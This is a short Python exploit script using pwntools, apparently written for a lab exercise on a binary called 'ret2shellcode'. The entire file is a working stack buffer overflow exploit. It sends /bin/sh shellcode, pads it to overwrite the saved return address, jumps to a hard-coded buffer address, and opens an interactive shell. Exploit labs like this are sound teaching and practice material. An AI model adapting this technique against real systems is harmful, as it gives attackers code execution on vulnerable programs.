'''
Author: p0p1ng
Date: 2023-11-18 17:30:42
LastEditTime: 2023-11-18 17:33:24
Description: 
FilePath: /实验2A/exp2.py
'''

from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(0x6C+4, b'A') + p32(buf2_addr))
sh.interactive()